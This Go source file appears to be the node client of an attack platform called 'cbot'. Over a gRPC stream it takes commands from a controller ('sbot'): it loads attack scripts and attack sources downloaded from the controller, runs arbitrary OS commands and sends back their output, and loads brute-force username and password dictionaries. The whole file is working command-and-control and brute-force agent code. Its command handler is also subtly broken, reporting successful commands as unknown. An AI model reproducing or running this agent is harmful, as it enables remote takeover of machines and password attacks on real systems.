package node

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/cbot/client/model"
	"github.com/cbot/client/service"
	"github.com/cbot/utils/fileutils"
	"google.golang.org/grpc"
	"io/ioutil"
	"log"
	"os/exec"
	"strings"
	"time"
)

type CmdClient struct {
	nd *Node

	grpcClient *grpc.ClientConn

	cmdClient service.CmdService_FetchCmdClient

	stop bool
}

func NewCmdClient(nd *Node, grpcClient *grpc.ClientConn) (*CmdClient, error) {

	cmdClient, err := service.NewCmdServiceClient(grpcClient).FetchCmd(context.Background())

	if err != nil {

		return nil, err
	}

	return &CmdClient{
		nd:         nd,
		grpcClient: grpcClient,
		cmdClient:  cmdClient,
		stop:       false,
	}, nil

}

func (cc *CmdClient) Start() error {

	err := cc.cmdClient.Send(&model.CmdReply{
		NodeId:   cc.nd.NodeId(),
		Status:   0,
		Time:     0,
		Contents: []byte{},
	})

	if err != nil {

		return err
	}

	go func() {
		for {

			if cc.stop {
				break
			}

			// receive a cmd
			cmd, err := cc.cmdClient.Recv()

			if err != nil {
				continue
			}

			content, err := cc.handle(cmd)
			status := 0
			if err != nil {

				status = -1
			}

			cc.cmdClient.Send(&model.CmdReply{
				NodeId:   cc.nd.NodeId(),
				Status:   int32(status),
				Time:     0,
				Contents: content,
			})

		}
	}()

	return nil
}

func (cc *CmdClient) Stop() {

	cc.stop = true

}

func (cc *CmdClient) handle(cmd *model.Cmd) ([]byte, error) {

	switch cmd.Code {

	case model.CmdCode_RunAddAttackSource:

		err := cc.addAttackSource(cmd.Args[0],strings.EqualFold(cmd.Name,"fromFile"))

		if err != nil {

			return []byte(fmt.Sprintf("Add Attack Source is failed:%v", err)), err
		}

	case model.CmdCode_RunAddAttack:

		err := cc.addAttack(cmd.Args[0],strings.EqualFold(cmd.Name,"fromFile"))

		if err != nil {

			return []byte(fmt.Sprintf("Add Attack  is failed:%v", err)), err
		}

	case model.CmdCode_RunOSCmd:
		return cc.runOsCmd(cmd.Name, cmd.Args)

	case model.CmdCode_RunAddDict:

		err := cc.addDict(cmd.Name, cmd.Args[0], cmd.Args[1])

		if err != nil {
			return []byte(fmt.Sprintf("Add Bruteforce dictory failed:%v", err)), err
		}
	}

	return []byte(fmt.Sprintf("Unkown cmd:%s", cmd.Name)), fmt.Errorf("Unkown cmd:%s", cmd.Name)
}

//add a attack source script

func (cc *CmdClient) addAttackSource(content string,fromFile bool) error {

	var sourceScript []byte

	var addSourceRequest model.AddAttackSourceRequest

	data, err := base64.StdEncoding.DecodeString(content)

	if err != nil {
		errS := fmt.Sprintf("Decode base64:%s for add attack source script failed:%v",content,err)
		log.Println(errS)

		return fmt.Errorf(errS)
	}

	if err = json.Unmarshal(data, &addSourceRequest); err != nil {

		errS := fmt.Sprintf("Decode json data:%s for add attack source script failed:%v",string(data),err)
		log.Println(errS)

		return fmt.Errorf(errS)
	}

	if fromFile {


		if sourceScript,err = cc.downloadAndRead(string(addSourceRequest.Content));err!=nil {

			errS := fmt.Sprintf("Download attack source script from sbot for add attack script failed:%v",err)
			log.Println(errS)

			return fmt.Errorf(errS)
		}
	}else {

		sourceScript = addSourceRequest.Content
	}


	return cc.nd.AddAttackSource(addSourceRequest.Name, addSourceRequest.Types, sourceScript)

}

//add a attack script
func (cc *CmdClient) addAttack(content string,fromFile bool) error {

	var attackScript []byte

	var addAttackRequest model.AddAttackRequest

	data, err := base64.StdEncoding.DecodeString(content)

	if err != nil {

		errS := fmt.Sprintf("Decode base64:%s for add attack script failed:%v",content,err)
		log.Println(errS)

		return fmt.Errorf(errS)

	}

	if err = json.Unmarshal(data, &addAttackRequest); err != nil {
		errS := fmt.Sprintf("Decode json data:%s for add attack script failed:%v",string(data),err)
		log.Println(errS)

		return fmt.Errorf(errS)
	}

	if fromFile {


		if attackScript,err = cc.downloadAndRead(string(addAttackRequest.Content));err!=nil {

			errS := fmt.Sprintf("Download attack script from sbot for add attack script failed:%v",err)
			log.Println(errS)

			return fmt.Errorf(errS)
		}
	}else {

		attackScript = addAttackRequest.Content
	}

	return cc.nd.AddAttack(addAttackRequest.Name, addAttackRequest.AttackType, addAttackRequest.DefaultProto,
		int(addAttackRequest.DefaultPort), attackScript)

}

//run os cmd
func (cc *CmdClient) runOsCmd(name string, args []string) ([]byte, error) {

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, name, args...)

	res, err := cmd.CombinedOutput()

	if err != nil {

		log.Printf("Run os cmd:%s is failed:%v",name,err)

		return []byte(fmt.Sprintf("%v", err)), err
	}

	log.Printf("Run os cmd:%s,result:%s",name,res)

	return []byte(res), nil
}

//add bruteforce dictory
func (cc *CmdClient) addDict(name string, users string, passwds string) error {

	usersArr := strings.Split(users,",")

	if strings.Contains(passwds,",") {
		cc.nd.AddDict(name,usersArr, strings.Split(passwds, ","))
	}else {


		if passwdArr,err:= cc.downloadAndReadLine(passwds);err!=nil {

			errS := fmt.Sprintf("Add Bruteforce dictory failed:%v for name:%s",err,name)
			log.Println(errS)

			return fmt.Errorf(errS)
		}else {

			cc.nd.AddDict(name,usersArr, passwdArr)
		}
	}

	log.Printf("Add bruteforce ok for name:%s",name)

	return nil
}


func (cc *CmdClient) downloadAndRead(fname string)([]byte,error) {


	if fpath,err := cc.nd.fserverClient.Download(fname);err!=nil {

		errS := fmt.Sprintf("Download file:%s from sbot is failed:%v",fname,err)
		log.Println(errS)

		return nil, fmt.Errorf(errS)
	}else {

		return ioutil.ReadFile(fpath)
	}
}

func (cc *CmdClient) downloadAndReadLine(fname string)([]string,error) {

	if fpath,err := cc.nd.fserverClient.Download(fname);err!=nil {

		errS := fmt.Sprintf("Download file:%s from sbot is failed:%v",fname,err)
		log.Println(errS)

		return nil, fmt.Errorf(errS)
	}else {

		return fileutils.ReadAllLines(fpath)
	}

}

